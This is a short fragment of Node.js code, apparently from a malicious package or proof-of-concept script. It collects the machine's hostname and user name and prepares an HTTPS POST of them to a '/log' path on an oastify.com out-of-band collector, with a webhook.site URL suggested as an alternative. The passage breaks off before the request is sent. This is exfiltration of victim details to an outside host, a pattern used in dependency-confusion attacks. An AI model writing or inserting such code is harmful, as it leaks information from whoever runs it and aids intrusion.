...
const data = JSON.stringify({ hostname: require('os').hostname(), username: process.env.USER || process.env.USERNAME });
const options = {
  hostname: "https://qztcb2ko909mwaoafdt66xiw9nfe3dr2.oastify.com", // or your webhook.site URL
  port: 443,
  path: "/log",
  method: "POST",
  headers: {
